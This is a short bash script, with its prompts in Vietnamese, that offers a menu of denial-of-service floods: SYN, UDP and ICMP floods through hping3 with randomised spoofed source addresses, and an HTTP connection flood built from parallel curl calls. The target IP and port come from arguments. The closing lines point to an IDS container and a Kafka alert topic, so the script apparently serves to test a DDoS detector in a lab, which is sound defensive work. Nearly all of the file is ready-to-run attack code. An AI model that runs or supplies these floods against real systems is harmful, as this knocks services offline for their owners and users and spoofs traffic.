#!/bin/bash
# Quick DDoS Testing Script using hping3

set -e

TARGET_IP=${1:-"192.168.1.200"}
TARGET_PORT=${2:-"80"}
DURATION=${3:-30}

echo "=================================="
echo "🎯 Quick DDoS Test với hping3"
echo "=================================="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "=================================="

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo "❌ hping3 not found!"
    echo "Install với: sudo apt-get install hping3"
    exit 1
fi

echo ""
echo "Chọn loại attack:"
echo "1) SYN Flood (TCP)"
echo "2) UDP Flood"
echo "3) ICMP Flood (Ping)"
echo "4) HTTP Flood (slow)"
read -p "Lựa chọn (1-4): " choice

case $choice in
    1)
        echo ""
        echo "🚀 Starting SYN Flood..."
        echo "Gửi SYN packets với tốc độ cao"
        sudo timeout ${DURATION}s hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP
        ;;
    2)
        echo ""
        echo "🚀 Starting UDP Flood..."
        echo "Gửi UDP packets với tốc độ cao"
        sudo timeout ${DURATION}s hping3 --udp -p $TARGET_PORT --flood --rand-source $TARGET_IP
        ;;
    3)
        echo ""
        echo "🚀 Starting ICMP Flood..."
        echo "Gửi ICMP (ping) packets với tốc độ cao"
        sudo timeout ${DURATION}s hping3 --icmp --flood --rand-source $TARGET_IP
        ;;
    4)
        echo ""
        echo "🚀 Starting HTTP Flood (slow connections)..."
        for i in {1..100}; do
            (curl -s http://$TARGET_IP:$TARGET_PORT/ --max-time 30 &)
        done
        sleep $DURATION
        ;;
    *)
        echo "❌ Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "✅ Test completed!"
echo ""
echo "📊 Check results:"
echo "  docker logs -f ids_ddos_detector"
echo "  kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic ddos-alerts"
